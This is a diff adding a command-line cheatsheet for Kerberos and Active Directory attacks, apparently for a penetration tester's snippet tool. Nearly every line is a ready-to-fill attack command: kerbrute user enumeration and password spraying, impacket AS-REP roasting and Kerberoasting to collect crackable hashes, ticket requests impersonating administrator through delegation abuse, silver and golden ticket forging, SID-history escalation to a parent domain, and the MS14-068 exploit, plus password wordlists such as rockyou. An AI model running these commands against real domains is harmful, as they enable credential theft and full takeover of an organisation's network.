@@ -1,0 +1,87 @@
+% kerberos, ad, roast
+
+; --- clock sync (Kerberos needs <5min skew) ---
+# Sync local clock to the DC via hostname
+sudo ntpdate <domain>
+
+# rdate fallback via IP
+sudo rdate -n <ip>
+
+; --- user enum / spray (kerbrute) ---
+# User enumeration (no creds; KDC error-code probe)
+kerbrute userenum --dc <ip> -d <domain> <wordlist>
+
+# Password spray a small common-password list
+kerbrute passwordspray --dc <ip> -d <domain> users.txt 'Welcome1'
+
+# Spray via NetExec SMB (continue on success)
+nxc smb <ip> -u users.txt -p 'Welcome1' --continue-on-success
+
+; --- AS-REP roast (impacket) ---
+# From a users file, no creds
+impacket-GetNPUsers -dc-ip <ip> -no-pass -usersfile users.txt -format hashcat -outputfile asrep.hash <domain>/
+
+# All DONT_REQ_PREAUTH accounts (needs LDAP creds)
+impacket-GetNPUsers -dc-ip <ip> -request -outputfile asrep.hash <domain>/<user>:<pass>
+
+# Via NT hash
+impacket-GetNPUsers -dc-ip <ip> -request -hashes :<nthash> -outputfile asrep.hash <domain>/<user>
+
+; --- Kerberoast (impacket) ---
+# Request SPN tickets (needs valid creds)
+impacket-GetUserSPNs -dc-ip <ip> -request -outputfile kerberoast.hash <domain>/<user>:<pass>
+
+# Via NT hash
+impacket-GetUserSPNs -dc-ip <ip> -request -hashes :<nthash> -outputfile kerberoast.hash <domain>/<user>
+
+; --- ticket requests (impacket) ---
+# Request a TGT with a password
+impacket-getTGT <domain>/<user>:<pass>
+
+# Request a TGT via NT hash
+impacket-getTGT -hashes :<nthash> <domain>/<user>
+
+# Request a TGT for a machine account
+impacket-getTGT <domain>/'<host>$':<pass>
+
+# Request a TGT via AES key
+impacket-getTGT -aesKey <aeskey> <domain>/<user>
+
+# Request a TGT with explicit DC IP
+impacket-getTGT -dc-ip <ip> <domain>/<user>:<pass>
+
+# Service ticket for an SPN (needs TGT in KRB5CCNAME)
+impacket-getST -spn cifs/dc.<domain> <domain>/<user>:<pass>
+
+# S4U2self -> S4U2proxy (constrained delegation w/ protocol transition)
+impacket-getST -spn cifs/dc.<domain> -impersonate administrator <domain>/<user>:<pass>
+
+# RBCD impersonation (HOST$ has GenericWrite on target)
+impacket-getST -spn cifs/<target>.<domain> -impersonate administrator <domain>/'<host>$':<pass>
+
+; --- ticket forging (impacket) ---
+# Silver ticket via service-account NT hash
+impacket-ticketer -nthash <nthash> -domain-sid <sid> -domain <domain> -spn cifs/dc.<domain> administrator
+
+# Silver ticket via service-account AES256 key
+impacket-ticketer -aesKey <aeskey> -domain-sid <sid> -domain <domain> -spn cifs/dc.<domain> administrator
+
+# Golden ticket via krbtgt NT hash
+impacket-ticketer -nthash <krbtgt_hash> -domain-sid <sid> -domain <domain> administrator
+
+# Golden ticket via krbtgt AES256 key
+impacket-ticketer -aesKey <aeskey> -domain-sid <sid> -domain <domain> administrator
+
+# raiseChild: child -> parent via SID history
+impacket-raiseChild -target-exec dc.<parent_domain> <domain>/<user>:<pass>
+
+# goldenPac: MS14-068 (legacy labs)
+impacket-goldenPac -dc-ip <ip> <domain>/<user>:<pass>
+
+; user/password lists live under $HOME/wordlists/SecLists
+$ wordlist: printf '%s\n' \
+    "$HOME/wordlists/SecLists/Usernames/Names/names.txt" \
+    "$HOME/wordlists/SecLists/Usernames/top-usernames-shortlist.txt" \
+    "$HOME/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt" \
+    "$HOME/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt" \
+    "/usr/share/wordlists/rockyou.txt"
